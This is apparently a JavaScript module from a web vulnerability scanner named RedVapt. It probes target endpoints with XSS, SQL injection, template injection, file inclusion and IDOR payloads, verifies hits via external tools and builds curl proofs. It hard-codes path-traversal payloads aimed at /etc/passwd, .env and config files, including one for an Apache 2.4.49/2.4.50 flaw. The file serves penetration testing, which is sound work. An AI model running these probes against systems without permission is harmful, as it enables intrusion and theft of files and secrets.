/**
 * vuln/unifiedEngine.js — Hybrid Vulnerability Scanning Engine v2
 *
 * Architecture:
 *   1. generateCandidates()   — endpoints + params → rich candidate objects
 *   2. scoreCandidates()      — priority 0-100+ based on param/path/reflection
 *   3. Top 100 by score       — focus effort on highest-value targets
 *
 *   Per candidate:
 *   4. detectSignal()         — baseline+inject probe pair → confidence 0-1
 *   5a. confidence ≥ 0.70     → routeToVerifier() [sqlmap / dalfox / internal]
 *   5b. confidence < 0.70 but → runVerificationPipeline() [fallback]
 *       some signal exists
 *   6. Store confirmed finding with full evidence chain
 *
 * Plus: after recon, if tech stack found → nuclei CVE scan runs once per target.
 *
 * Focus: XSS, SQLi, SSTI, LFI, InfoDisclosure.
 * Security: all tool calls use execFile() via verifiers, never exec().
 */

import axios from 'axios';
import https from 'https';
import crypto from 'crypto';
import { getTemplate, getAllTemplates, buildXssMatchers, getXssPayloadsForContext, getXssProbe } from './templates/index.js';
import { classifyResponse, generateAdaptivePayloads } from './adaptivePayloads.js';
import { analyzeReflectionContext, CONTEXT_CODES } from './xssContextDetector.js';
import { runVerificationPipeline, generateProofToken } from './verificationPipeline.js';
import { detectSignal } from '../verifiers/signalEngine.js';
import { routeToVerifier, runNucleiScan } from '../verifiers/verifierRouter.js';

const CONCURRENCY = 8;   // parallel candidates
/** Top N after scoring — classic vuln labs expose many parameterized pages; 150 starved coverage. */
const MAX_CANDIDATES = 280;
/** Per path (no query): was 4, which capped each .aspx to a handful of tests and missed most vuln classes. */
const MAX_CANDIDATES_PER_URL = 14;

// ── HTTP client ───────────────────────────────────────────────────────────────

const httpClient = axios.create({
    timeout: 12_000,
    validateStatus: () => true,
    maxRedirects: 5,
    headers: { 'User-Agent': 'Mozilla/5.0 (compatible; RedVapt/2.0; SecurityScanner)' },
    httpsAgent: new https.Agent({ rejectUnauthorized: false }),
});

// ── Scope guard ───────────────────────────────────────────────────────────────

const PRIVATE_RE = /^https?:\/\/(localhost|127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|0\.0\.0\.0)/i;
const BLOCKED_TLDS = new Set(['google.com', 'googleapis.com', 'youtube.com', 'facebook.com', 'twitter.com', 'cloudflare.com']);

function scopeCheck(url, allowedHost) {
    if (!url) return false;
    // Handle URLs without protocol — prepend https:// so URL parser works
    let normalizedUrl = url;
    if (!normalizedUrl.startsWith('http://') && !normalizedUrl.startsWith('https://')) {
        normalizedUrl = `https://${normalizedUrl}`;
    }
    if (PRIVATE_RE.test(normalizedUrl)) return false;
    try {
        const h = new URL(normalizedUrl).hostname.toLowerCase();
        if ([...BLOCKED_TLDS].some(b => h === b || h.endsWith('.' + b))) return false;
        if (allowedHost && h !== allowedHost && !h.endsWith('.' + allowedHost)) return false;
        return true;
    } catch { return false; }
}

// Protocol-aware base URL builder — determines HTTP vs HTTPS for the target
let _resolvedBaseUrl = null;
async function resolveBaseUrl(target) {
    if (_resolvedBaseUrl) return _resolvedBaseUrl;

    // Try HTTP first (many legacy targets like TestFire are HTTP-only)
    for (const proto of ['http', 'https']) {
        try {
            const testUrl = `${proto}://${target}`;
            const r = await httpClient.head(testUrl, { timeout: 5000, maxRedirects: 3 });
            if (r.status >= 200 && r.status < 500) {
                _resolvedBaseUrl = testUrl;
                console.log(`[UnifiedEngine] Resolved base URL: ${_resolvedBaseUrl}`);
                return _resolvedBaseUrl;
            }
        } catch { }
    }
    _resolvedBaseUrl = `http://${target}`; // Default to HTTP for legacy targets
    return _resolvedBaseUrl;
}

// ── Priority scoring ──────────────────────────────────────────────────────────

const INTERESTING_PARAMS = new Set(['id', 'uid', 'q', 'search', 'query', 'name', 'user', 'redirect', 'url', 'src', 'dest', 'page', 'file', 'path', 'cmd', 'title', 'text', 'msg', 'content', 'item', 'cat', 'doc', 'include', 'dir', 'template', 'folder', 'load', 'view', 'resource', 'lang', 'module', 'conf', 'filename', 'download']);
const LFI_PARAMS = new Set(['file', 'path', 'page', 'doc', 'include', 'dir', 'template', 'folder', 'load', 'view', 'resource', 'lang', 'module', 'conf', 'filename', 'download', 'src', 'content']);
// FIX: Use word boundaries to prevent false matches (e.g. 'author' matching 'auth')
const SENSITIVE_PATHS = /\/\b(admin|api|auth|login|signin|register|user|account|profile|dashboard|search|upload|import|export|debug|test|dev)\b/i;
const LFI_PATHS = /\/\b(include|load|view|read|render|display|open|show|fetch|download|file|static|template|assets)\b/i;
const JSON_API_PATH = /\/(api|graphql|rpc|v[0-9])\//i;
// Junk paths from FFUF that waste scanning time
const JUNK_PATH_RE = /(_vti_bin|_vti_cnf|_vti_pvt|cgi-bin|\.dll$|\.ico$|\.css$|\.woff|\.ttf|\.eot|wp-includes|wp-content\/plugins)/i;
// Real API path bonus
const REAL_API_PATH = /\/(api|rest|graphql)\//i;

function scoreCandidate(candidate) {
    let score = 10; // base

    // Parameter presence
    if (candidate.paramName) score += 30;

    // Interesting param name
    if (INTERESTING_PARAMS.has(candidate.paramName?.toLowerCase())) score += 40;

    // Sensitive path (with word-boundary regex)
    if (SENSITIVE_PATHS.test(candidate.url)) score += 50;

    // Real API path bonus (these are the highest-value targets on SPAs)
    if (REAL_API_PATH.test(candidate.url)) score += 40;

    // JSON/API path
    if (JSON_API_PATH.test(candidate.url)) score += 20;

    // Source hints (from JS analysis)
    if (candidate.fromJs) score += 20;

    // VulnType weights (critical impact types score higher)
    if (candidate.template.type === 'SQL Injection') score += 15;
    if (candidate.template.type === 'SSTI') score += 10;

    // POST forms are often more vulnerable
    if (candidate.method === 'POST') score += 15;

    // LFI-specific param/path bonuses
    if (LFI_PARAMS.has(candidate.paramName?.toLowerCase()) && candidate.template.type === 'LFI') score += 35;
    if (LFI_PATHS.test(candidate.url) && candidate.template.type === 'LFI') score += 25;

    // V3 fix: synthetic params are valid on clean URLs without queries
    // if (candidate.synthetic) score -= 30; // Removed penalty as it suppresses SPA scans

    // Bonus for JSON API Candidates
    if (candidate.jsonBonus) score += 20;

    // [R4] De-prioritize junk paths to save slots for higher-value targets
    if (JUNK_PATH_RE.test(candidate.url)) score -= 70;

    return score;
}

// ── Extract params ────────────────────────────────────────────────────────────

function extractParams(url) {
    try { return [...new URL(url).searchParams.keys()]; } catch { return []; }
}

// Injected on parameterless URLs only — not used to skip real HTML form fields
const SYNTHETIC_PARAMS = ['id', 'q', 'search', 'page'];

/** ASP.NET / Rails meta fields — skip only these on forms, not real inputs named id/search/q */
const FORM_META_SKIP = new Set([
    '__viewstate', '__eventvalidation', '__viewstategenerator', '__requestverificationtoken',
    '__previouspage', '__scrollpositionx', '__scrollpositiony', 'authenticity_token', '_csrf',
]);

// ── Candidate generation ──────────────────────────────────────────────────────

function generateCandidates(target, endpoints, forms, vulnTypes, attackPlan) {
    const templates = (vulnTypes || ['XSS', 'SQLi', 'SSTI'])
        .map(t => getTemplate(t)).filter(Boolean);

    const candidates = [];
    const seen = new Set();

    const add = (url, method, paramName, injectIn, template, extra = {}) => {
        const key = `${url}::${paramName}::${template.type}::${method}`;
        if (seen.has(key)) return;
        seen.add(key);
        candidates.push({ url, method, paramName, injectIn, template, baselineValue: '1', ...extra });
    };

    // From URL params
    for (const ep of endpoints) {
        const rawUrl = typeof ep === 'string' ? ep : ep.url || ep;
        if (!rawUrl || !scopeCheck(rawUrl, target)) continue;

        const params = extractParams(rawUrl);
        const base = rawUrl.split('?')[0];
        const fromJs = typeof ep === 'object' && ep.fromJs;

        if (params.length > 0) {
            for (const p of params) {
                for (const tmpl of templates) {
                    add(base, 'GET', p, 'query', tmpl, { fromJs });
                }
            }
        }
    }

    // From forms
    for (const form of forms) {
        const url = form.action || form.url;
        if (!url || !scopeCheck(url, target)) continue;

        const method = (form.method || 'POST').toUpperCase();
        for (const input of (form.inputs || [])) {
            const param = typeof input === 'string' ? input : input.name;
            const pl = (param || '').toLowerCase();
            if (!param || FORM_META_SKIP.has(pl)) continue;

            for (const tmpl of templates) {
                if (tmpl.type === 'CSRF' && method !== 'POST') continue;
                add(url, method, param, 'body', tmpl);
            }
        }
    }

    // Phase 11: From AI Attack Plan
    if (attackPlan && attackPlan.topTargets) {
        for (const targetRule of attackPlan.topTargets) {
            const url = targetRule.url;
            if (!url) continue;

            const method = (targetRule.method || 'GET').toUpperCase();
            // Default params if none provided by AI
            const params = targetRule.params || extractParams(url) || ['q'];
            if (params.length === 0) continue;

            for (const param of params) {
                for (const vulnType of (targetRule.attackVectors || ['SQLI', 'XSS'])) {
                    const tmpl = getTemplate(vulnType.toLowerCase().replace('_', ''));
                    if (tmpl) add(url, method, param, method === 'GET' ? 'query' : 'body', tmpl, { fromPlan: true });
                }
            }
        }
    }

    // FIX: Inject synthetic params into endpoints that have NO query params.
    // Without this, parameterless API endpoints (e.g. /api/Products) are completely
    // skipped, leaving the entire vuln engine with 0 candidates for SPA targets.
    const endpointsCovered = new Set();
    for (const c of candidates) endpointsCovered.add(c.url);

    for (const ep of endpoints) {
        const rawUrl = typeof ep === 'string' ? ep : ep.url || ep;
        if (!rawUrl || !scopeCheck(rawUrl, target)) continue;

        const base = rawUrl.split('?')[0];
        const existingParams = extractParams(rawUrl);

        // -- Phase 2: Header-based Specific Tech Targeting --
        if (typeof ep === 'object' && !endpointsCovered.has(base)) {
            const serverInfo = (ep.server_header || '').toLowerCase();
            if (serverInfo.includes('apache/2.4.49') || serverInfo.includes('apache/2.4.50')) {
                const cveTmpl = templates.find(t => t.type === 'LFI');
                if (cveTmpl) {
                    add(`${base}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd`, 'GET', 'path', 'path', cveTmpl, { bonusScore: 200, synthetic: false });
                }
            }
            if (serverInfo.includes('php')) {
                const lfiTmpl = templates.find(t => t.type === 'LFI');
                if (lfiTmpl) {
                    add(base, 'GET', 'page', 'query', lfiTmpl, { bonusScore: 80, synthetic: true });
                    add(base, 'GET', 'file', 'query', lfiTmpl, { bonusScore: 80, synthetic: true });
                }
            }
        }

        // Only inject synthetic params if endpoint has NO real params AND hasn't been covered
        if (existingParams.length === 0 && !endpointsCovered.has(base)) {
            for (const syntheticParam of SYNTHETIC_PARAMS) {
                for (const tmpl of templates) {
                    add(base, 'GET', syntheticParam, 'query', tmpl, { synthetic: true });
                }
            }
            endpointsCovered.add(base);
        }
    }

    // FIX: Generate DirListing candidates — probe paths against base URL
    const dirListingTemplate = getTemplate('DirListing');
    if (dirListingTemplate && vulnTypes?.includes('DirListing') || (!vulnTypes && dirListingTemplate)) {
        // Use resolved protocol instead of hardcoded https://
        const baseUrl = _resolvedBaseUrl || `http://${target}`;
        for (const probePath of (dirListingTemplate.payloads || []).slice(0, 10)) {
            const probeUrl = `${baseUrl}${probePath}`;
            add(probeUrl, 'GET', '__dir_probe__', 'query', dirListingTemplate, { isDirProbe: true });
        }
    }

    // FIX: Generate IDOR candidates — target API endpoints with ID-like params
    const idorTemplate = getTemplate('IDOR');
    if (idorTemplate && (vulnTypes?.includes('IDOR') || !vulnTypes)) {
        const idorParams = new Set(['id', 'uid', 'userId', 'user_id', 'BasketId', 'orderId', 'order_id', 'itemId', 'productId']);
        for (const ep of endpoints) {
            const rawUrl = typeof ep === 'string' ? ep : ep.url || ep;
            if (!rawUrl || !scopeCheck(rawUrl, target)) continue;
            const params = extractParams(rawUrl);
            const base = rawUrl.split('?')[0];
            for (const p of params) {
                if (idorParams.has(p) || /id$/i.test(p)) {
                    add(base, 'GET', p, 'query', idorTemplate, { isIdorProbe: true });
                }
            }
            // Also check REST-style paths like /api/Baskets/1
            if (/\/api\/|\/(rest|v[0-9])\//i.test(base) && /\/\d+$/.test(base)) {
                add(base, 'GET', '__path_id__', 'query', idorTemplate, { isIdorProbe: true });
            }
        }
    }

    // -- NEW: JSON Body candidates for APIs --
    const JSON_API_PATH = /(\/api\/|\/rest\/|\/graphql)/i;
    for (const ep of endpoints) {
        const rawUrl = typeof ep === 'string' ? ep : ep.url || ep;
        if (!rawUrl || !scopeCheck(rawUrl, target)) continue;
        const base = rawUrl.split('?')[0];

        if (JSON_API_PATH.test(base)) {
            const jsonParams = ["id", "q", "search", "email", "username", "password", "message"];
            for (const param of jsonParams) {
                for (const tmpl of templates) {
                    add(base, 'POST', param, 'json_body', tmpl, { jsonBonus: true });
                }
            }
        }
    }

    return candidates;
}

// ── Concurrency runner ────────────────────────────────────────────────────────

async function runConcurrent(tasks, concurrency, onTick) {
    const results = [];
    let idx = 0;
    async function worker() {
        while (idx < tasks.length) {
            const i = idx++;
            const r = await tasks[i]();
            if (r) results.push(...(Array.isArray(r) ? r : [r]));
            if (onTick) onTick(i + 1, tasks.length);
        }
    }
    await Promise.all(Array.from({ length: concurrency }, worker));
    return results;
}

// ── Build confirmed finding from verifier result ─────────────────────────────

function generateCurlCommand(request) {
    if (!request) return null;
    let cmd = `curl -i -s -k -X ${request.method} "${request.url}"`;
    const headers = request.headers || {};
    for (const [k, v] of Object.entries(headers)) {
        if (k.toLowerCase() === 'user-agent' && v.includes('RedVapt')) continue;
        cmd += ` -H "${k}: ${v}"`;
    }
    if (request.data) {
        const d = typeof request.data === 'string' ? request.data : JSON.stringify(request.data);
        cmd += ` --data "${d.replace(/"/g, '\\"')}"`;
    }
    return cmd;
}

function buildConfirmedFinding({ candidate, signal, verifierResult, proofToken, payload }) {
    const curl = generateCurlCommand(signal.injected?.request);
    return {
        id: `RV-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
        type: candidate.template.type,
        severity: verifierResult.severity || candidate.template.severity,
        confidence: verifierResult.confirmed ? 'Confirmed via Tool' : 'High Confidence',
        endpoint: candidate.url,
        param: candidate.paramName,
        method: candidate.method,
        payload,
        proofToken,
        curlPoC: curl,
        evidence: {
            request: generateCurlCommand(signal.injected?.request),
            response_snippet: signal.evidenceSnippet || (signal.injected?.body || '').slice(0, 1000),
            signal_type: signal.signalType,
            signal_confidence: signal.confidence,
            evidence_snippet: signal.evidenceSnippet,
            tool_used: verifierResult.tool,
            tool_evidence: verifierResult.evidence,
            tool_output: (verifierResult.rawOutput || '').slice(0, 500),
            baseline: {
                status: signal.baseline?.status,
                size: signal.baseline?.size,
                time: signal.baseline?.elapsed,
            },
            injected: {
                status: signal.injected?.status,
                size: signal.injected?.size,
                time: signal.injected?.elapsed,
            },
            diff_score: signal.diffScore,
        },
        owasp: candidate.template.owasp,
        remediation: candidate.template.remediation,
        impact: candidate.template.impact,
        confirmedAt: new Date().toISOString(),
    };
}

// ── Main scan ─────────────────────────────────────────────────────────────────

/**
 * @param {object} params
 * @param {string}   params.target
 * @param {Array}    params.endpoints
 * @param {Array}    params.forms
 * @param {string[]} [params.vulnTypes]     - defaults to ['XSS','SQLi','SSTI']
 * @param {string[]} [params.technologies]  - from recon (for nuclei)
 * @param {Function} [params.onProgress]
 */
export async function runUnifiedScan({ target, endpoints = [], forms = [], vulnTypes = null, technologies = [], attackPlan = null, customPayloads = null, onProgress = () => { } }) {
    const activeTypes = vulnTypes || ['XSS', 'SQLi', 'SSTI', 'LFI', 'DirListing', 'IDOR', 'CSRF'];

    // Fresh protocol resolution per scan (module cache caused wrong host/protocol on back-to-back scans)
    _resolvedBaseUrl = null;

    // Phase 9 FIX: Resolve working protocol for this target ONCE
    const baseUrl = await resolveBaseUrl(target);
    onProgress({ phase: 'vuln_scan', status: 'running', message: `🌐 Target protocol resolved: ${baseUrl}` });

    // ── Step 1: Generate candidates ───────────────────────────────────────────
    const raw = generateCandidates(target, endpoints, forms, activeTypes, attackPlan);

    // [R4] Junk path de-prioritization (handled in scoreCandidate)
    const filteredRaw = raw;

    // ── Step 2: Score + select top N with DIVERSITY enforcement ──────────────
    const allScored = filteredRaw.map(c => ({ ...c, priority: scoreCandidate(c) }))
        .sort((a, b) => {
            if (b.priority !== a.priority) return b.priority - a.priority;
            // Secondary sort ensures deterministic selection when priorities are equal
            const keyA = `${a.url}|${a.method}|${a.param}|${a.template.type}`;
            const keyB = `${b.url}|${b.method}|${b.param}|${b.template.type}`;
            return keyA.localeCompare(keyB);
        });

    // Enforce per-URL diversity: max MAX_CANDIDATES_PER_URL candidates per base URL
    const urlCounts = new Map();
    const scored = [];
    for (const c of allScored) {
        const baseUrl = c.url.split('?')[0];
        const count = urlCounts.get(baseUrl) || 0;
        if (count >= MAX_CANDIDATES_PER_URL) continue;
        urlCounts.set(baseUrl, count + 1);
        scored.push(c);
        if (scored.length >= MAX_CANDIDATES) break;
    }

    if (scored.length === 0) {
        onProgress({ phase: 'vuln_scan', status: 'done', message: '⚠️ UnifiedEngine: No candidates (no endpoints/forms found)' });
        return { findings: [], attemptedFindings: [], observedHeaders: {} };
    }

    onProgress({
        phase: 'vuln_scan', status: 'running',
        message: `🎯 UnifiedEngine: ${scored.length} candidates (of ${raw.length} generated), top priority: ${scored[0].url} (${scored[0].priority}pts)`,
    });

    const findings = [];
    const attemptedFindings = [];
    const observedHeaders = {};

    // ── Step 3: Nuclei scan (once per target, if tech stack known) ────────────
    if (technologies.length > 0) {
        onProgress({ phase: 'vuln_scan', status: 'running', message: `🔬 Running nuclei CVE scan (tech: ${technologies.slice(0, 4).join(', ')})...` });
        const baseUrl = _resolvedBaseUrl || `http://${target}`;
        const nucleiResults = await runNucleiScan({ url: baseUrl, technologies, onProgress });
        const nucleiFindings = (nucleiResults || []).filter(r => r.confirmed).map(r => ({
            id: `RV-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
            type: r.metadata?.name || 'CVE/Misconfiguration',
            severity: r.severity,
            confidence: 'confirmed',
            endpoint: r.metadata?.url || baseUrl,
            param: null,
            method: 'GET',
            payload: null,
            evidence: { tool_used: 'nuclei', tool_evidence: r.evidence, tool_output: (r.rawOutput || '').slice(0, 400) },
            owasp: 'A06:2021',
            remediation: 'Apply security patches and update vulnerable components.',
            impact: r.evidence,
            confirmedAt: new Date().toISOString(),
        }));
        findings.push(...nucleiFindings);
        if (nucleiFindings.length > 0) {
            onProgress({ phase: 'vuln_scan', status: 'running', message: `🚨 nuclei: ${nucleiFindings.length} CVE/misconfig findings added` });
        }
    }

    // ── Step 4: Per-candidate signal → verify pipeline ────────────────────────
    const tasks = scored.map((candidate, idx) => async () => {
        const { url, method, paramName, injectIn, template, baselineValue } = candidate;
        const isXss = template.type === 'XSS';

        // ── PHASE 1 (XSS only): Context probe to find WHERE input lands ───────
        // Inject a harmless marker, detect context, then pick precise payloads.
        // This is what a senior bug bounty hunter does: probe first, attack precisely.
        let xssContextPayloads = null;  // null = not an XSS test or probe failed
        let xssHtmlencoded = false;

        if (isXss) {
            const ctxMarker = `rvctx_${crypto.randomBytes(4).toString('hex')}`;
            const probe = getXssProbe(ctxMarker);  // e.g. <rvctx_ab12cd34>

            try {
                const probeSignal = await detectSignal({
                    url, method, paramName, injectIn,
                    payload: probe,
                    baselineValue,
                    proofToken: ctxMarker,
                    vulnType: 'XSS',
                    expectedDelay: 0,
                });

                const responseBody = probeSignal.injected?.body || '';
                const { context, htmlspecialcharsActive } = analyzeReflectionContext(ctxMarker, responseBody);
                xssHtmlencoded = htmlspecialcharsActive;

                if (context !== CONTEXT_CODES.NO_REFLECTION) {
                    // Great — we know exactly where input lands. Get targeted payloads (untstamped).
                    xssContextPayloads = getXssPayloadsForContext(context, {
                        htmlencoded: htmlspecialcharsActive,
                    });

                    onProgress({
                        phase: 'vuln_scan', status: 'running',
                        message: `🔍 XSS context: [${context}]${htmlspecialcharsActive ? ' + htmlspecialchars detected' : ''} at ${url}[${paramName}] → ${xssContextPayloads.length} targeted payloads`,
                    });
                } else {
                    onProgress({
                        phase: 'vuln_scan', status: 'running',
                        message: `🤷 XSS: No reflection at ${url}[${paramName}], falling back to polyglots`,
                    });
                }
            } catch (probeErr) {
                // Probe failed — fall back silently to template payloads
            }
        }

        // ── PHASE 2: Attack with context-specific or generic payloads ─────────
        // If we detected XSS context → use precise context payloads
        // Otherwise → fall back to template payloads (polyglots)
        const fullPayloadList = customPayloads || xssContextPayloads || template.payloads;
        // Limit to top 5 payloads per candidate (raised from 3 for better SQLi bypass coverage).
        // This ensures breadth-first coverage while catching more evasion variants.
        const payloadList = fullPayloadList.slice(0, 5);

        for (const rawPayload of payloadList) {
            // Generate token once for this payload attempt (XSS context payloads already have token embedded)
            const proofToken = generateProofToken();
            let payload = rawPayload.includes('TOKEN') ? rawPayload.replace(/TOKEN/g, proofToken) : rawPayload;

            // ── detectSignal: baseline + injected probe ───────────────────────
            const timingMatcher = (template.matchers || []).find(m => m.type === 'timing');
            const expectedDelay = timingMatcher?.minDelayMs || 0;

            const signal = await detectSignal({
                url, method, paramName, injectIn,
                payload, baselineValue,
                proofToken,
                vulnType: template.type === 'SQL Injection' ? 'SQLi' :
                    template.type === 'XSS' ? 'XSS' :
                        template.type === 'LFI' ? 'LFI' :
                            template.type === 'Information Disclosure' ? 'InfoDisclosure' : 'SSTI',
                expectedDelay,
                hiddenFields: candidate.hiddenFields || {},
            });

            // Collect response headers for security controls detection
            if (signal.injected?.headers) {
                for (const [k, v] of Object.entries(signal.injected.headers)) {
                    const lk = k.toLowerCase();
                    if (!observedHeaders[lk]) observedHeaders[lk] = v;
                }
            }

            // No signal at all — log attempt and try next payload
            if (!signal.signal && signal.confidence < 0.10) {
                // ADAPTIVE STEP: If it's a "no signal" but we have a hint (error/waf), try one adaptive payload
                const hints = classifyResponse(signal.injected?.body || '', signal.injected?.status || 0, signal.injected?.headers || {});
                if (hints.length > 0) {
                    const adaptivePayloads = generateAdaptivePayloads(
                        template.type === 'SQL Injection' ? 'SQLi' : template.type,
                        hints,
                        [payload],
                        proofToken,
                        1
                    );
                    const adaptivePayload = adaptivePayloads[0];
                    if (adaptivePayload && adaptivePayload !== payload) {
                        const adaptiveSignal = await detectSignal({
                            url, method, paramName, injectIn,
                            payload: adaptivePayload, baselineValue,
                            proofToken,
                            vulnType: template.type === 'SQL Injection' ? 'SQLi' :
                                template.type === 'XSS' ? 'XSS' :
                                    template.type === 'LFI' ? 'LFI' :
                                        template.type === 'Information Disclosure' ? 'InfoDisclosure' : 'SSTI',
                            expectedDelay,
                            hiddenFields: candidate.hiddenFields || {},
                        });
                        if (adaptiveSignal.signal) {
                            // Recovered with adaptive payload!
                            onProgress({
                                phase: 'vuln_scan', status: 'running',
                                message: `✨ Adaptive Recovery: ${adaptiveSignal.signalType} via ${hints.join(',')} hints at ${url}`,
                            });
                            // Proceed as if signal was found
                            Object.assign(signal, adaptiveSignal);
                            payload = adaptivePayload; // update payload for finding record
                        }
                    }
                }
            }

            if (!signal.signal && signal.confidence < 0.10) {
                attemptedFindings.push({
                    vulnType: template.type,
                    endpoint: url,
                    url,
                    param: paramName,
                    method,
                    payload: payload.slice(0, 200),
                    responseCode: signal.injected?.status,
                    responseTime: signal.injected?.elapsed,
                    responseSize: signal.injected?.size,
                    hadSignal: false,
                    signalType: null,
                    confidence: 0,
                    curlPoC: generateCurlCommand(signal.injected?.request),
                    // R9/R10: Full evidence pack
                    requestEvidence: signal.injected?.request || {
                        method,
                        url: injectIn === 'query' ? `${url}?${paramName}=${encodeURIComponent(payload.slice(0, 100))}` : url,
                        headers: { 'User-Agent': 'RedVapt/2.0' }
                    },
                    responseEvidence: {
                        statusCode: signal.injected?.status,
                        bodySnippet: (signal.injected?.body || '').slice(0, 800),
                        size: signal.injected?.size,
                        elapsed: signal.injected?.elapsed,
                        headers: signal.injected?.headers
                    },
                });
                continue;
            }

            onProgress({
                phase: 'vuln_scan', status: 'running',
                message: `📡 Signal: ${signal.signalType || 'weak'} (conf=${signal.confidence.toFixed(2)}) at ${url} [${paramName}]`,
            });

            // [S4 FIX] Handle Directory Listing as a standalone finding
            if (signal.signalType === 'directory_listing') {
                const dirFinding = {
                    id: `RV-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
                    type: 'Directory Listing',
                    severity: signal.metrics?.severity || 'Medium',
                    confidence: 'Confirmed via Signal',
                    endpoint: url,
                    param: paramName,
                    method: method,
                    payload: payload,
                    evidence: {
                        signal_type: 'directory_listing',
                        signal_confidence: signal.confidence,
                        evidence_snippet: signal.evidenceSnippet,
                        tool_used: 'RedVapt-Signal',
                        sensitive_files: signal.metrics?.sensitiveFiles || []
                    },
                    owasp: 'A01:2021',
                    remediation: 'Disable directory browsing in the web server configuration (e.g., Options -Indexes in Apache, autoindex off in nginx).',
                    impact: 'Exposes the internal file structure and potentially sensitive documents, source code, or backup files.',
                    confirmedAt: new Date().toISOString(),
                };
                onProgress({ phase: 'vuln_scan', status: 'finding', type: 'vuln_confirmed', message: `🚨 Directory Listing confirmed at ${url}`, vulnerability: dirFinding });
                findings.push(dirFinding);
            }

            // Bug #5 FIX: If DirListing signal found, immediately escalate to LFI/Traversal
            if (signal.signalType === 'dir_listing') {
                onProgress({ phase: 'vuln_scan', status: 'running', message: `🚀 DirListing found at ${url}! Escalating to Path Traversal probes...` });
                const lfiTmpl = getTemplate('LFI');
                if (lfiTmpl) {
                    // Test common sensitive files relative to the directory
                    const traversalPayloads = ['../../../../etc/passwd', '..%2f..%2f..%2f..%2fetc%2fpasswd', 'package.json', '.env', 'config.json'];
                    for (const tp of traversalPayloads) {
                        const lfiSignal = await detectSignal({
                            url, method: 'GET', paramName: 'file', injectIn: 'query',
                            payload: tp, baselineValue: '1', proofToken: 'root:x',
                            vulnType: 'LFI'
                        });
                        if (lfiSignal.signal) {
                            onProgress({ phase: 'vuln_scan', status: 'finding', type: 'vuln_confirmed', message: `🚨 LFI Confirmed via DirListing escalation at ${url}`, vulnerability: buildConfirmedFinding({ candidate: { ...candidate, template: lfiTmpl }, signal: lfiSignal, verifierResult: { confirmed: true, tool: 'RedVapt-Escalator' }, proofToken: 'root:x', payload: tp }) });
                        }
                    }
                }
            }

            // ── Path A: Any signal > 0.30 → external tool verifier ──────────────
            // [S3 FIX] Raised from 0.25 to 0.30 to avoid deep exploits on weak error patterns
            if (signal.confidence > 0.30) {
                const { routed, result } = await routeToVerifier({
                    url, method, param: paramName, injectIn,
                    proofToken, signal,
                    technologies,
                    onProgress,
                });

                if (routed && result?.confirmed) {
                    return buildConfirmedFinding({ candidate, signal, verifierResult: result, proofToken, payload });
                }

                // Tool ran but didn't confirm — log attempt and fall through
                if (routed && !result?.confirmed) {
                    attemptedFindings.push({
                        vulnType: template.type,
                        endpoint: url,
                        url,
                        param: paramName,
                        method,
                        payload: payload.slice(0, 200),
                        responseCode: signal.injected?.status,
                        responseTime: signal.injected?.elapsed,
                        responseSize: signal.injected?.size,
                        hadSignal: true,
                        signalType: signal.signalType,
                        confidence: signal.confidence,
                        toolUsed: result?.tool,
                        curlPoC: generateCurlCommand(signal.injected?.request),
                        // R9/R10: Full evidence pack
                        requestEvidence: signal.injected?.request || {
                            method,
                            url: injectIn === 'query' ? `${url}?${paramName}=${encodeURIComponent(payload.slice(0, 100))}` : url,
                            headers: { 'User-Agent': 'RedVapt/2.0' }
                        },
                        responseEvidence: {
                            statusCode: signal.injected?.status,
                            bodySnippet: (signal.injected?.body || '').slice(0, 800),
                            size: signal.injected?.size,
                            elapsed: signal.injected?.elapsed,
                            headers: signal.injected?.headers
                        },
                    });
                }
            }

            // ── Path B: Any signal → internal verificationPipeline (fallback) ──
            if (signal.confidence > 0) {
                const runtimeMatchers = template.type === 'XSS' ? buildXssMatchers(proofToken) : template.matchers;

                const finding = await runVerificationPipeline({
                    url, method, paramName, injectIn,
                    payload, baselineValue, template,
                    rawResponse: {
                        body: signal.injected?.body || '',
                        status: signal.injected?.status,
                        timingMs: signal.injected?.elapsed,
                        diffScore: signal.diffScore,
                    },
                    proofToken,
                    runtimeMatchers,
                    expectedDelay,
                });

                if (finding) {
                    // Enrich with signal data
                    finding.evidence = {
                        ...finding.evidence,
                        signal_type: signal.signalType,
                        signal_confidence: signal.confidence,
                        baseline: {
                            status: signal.baseline?.status,
                            size: signal.baseline?.size,
                            time: signal.baseline?.elapsed,
                        },
                        injected: {
                            status: signal.injected?.status,
                            size: signal.injected?.size,
                            time: signal.injected?.elapsed,
                        },
                    };

                    onProgress({
                        phase: 'vuln_scan', status: 'finding',
                        type: 'vuln_confirmed',
                        message: `🚨 ${finding.type} confirmed at ${url} param=${paramName}`,
                        vulnerability: finding,
                    });
                    return finding;
                }

                // Internal pipeline didn't confirm either — log attempt
                attemptedFindings.push({
                    vulnType: template.type,
                    endpoint: url,
                    url,
                    param: paramName,
                    method,
                    payload: payload.slice(0, 200),
                    responseCode: signal.injected?.status,
                    responseTime: signal.injected?.elapsed,
                    responseSize: signal.injected?.size,
                    hadSignal: signal.confidence > 0,
                    signalType: signal.signalType,
                    confidence: signal.confidence,
                    // R9/R10: Full evidence pack
                    requestEvidence: signal.injected?.request || {
                        method,
                        url: injectIn === 'query' ? `${url}?${paramName}=${encodeURIComponent(payload.slice(0, 100))}` : url,
                        headers: { 'User-Agent': 'RedVapt/2.0' }
                    },
                    responseEvidence: {
                        statusCode: signal.injected?.status,
                        bodySnippet: (signal.injected?.body || '').slice(0, 800),
                        size: signal.injected?.size,
                        elapsed: signal.injected?.elapsed,
                        headers: signal.injected?.headers
                    },
                });
            }
        }
        return null;
    });

    const candidateFindings = await runConcurrent(tasks, CONCURRENCY, (done, total) => {
        if (done % 20 === 0 || done === total) {
            onProgress({
                phase: 'vuln_scan', status: 'running',
                message: `🔄 Progress: ${done}/${total} candidates tested | ${findings.length} confirmed so far`,
            });
        }
    });

    findings.push(...candidateFindings);

    onProgress({
        phase: 'vuln_scan', status: 'done',
        message: `✅ UnifiedEngine complete: ${findings.length} confirmed, ${attemptedFindings.length} attempted (${scored.length} candidates tested)`,
    });

    return { findings, attemptedFindings, observedHeaders };
}

/**
 * Single-endpoint targeted scan (used by reactAgent and tests).
 * @param {object} opts
 * @param {string}   opts.url
 * @param {string}   opts.param
 * @param {string}   [opts.method='GET']
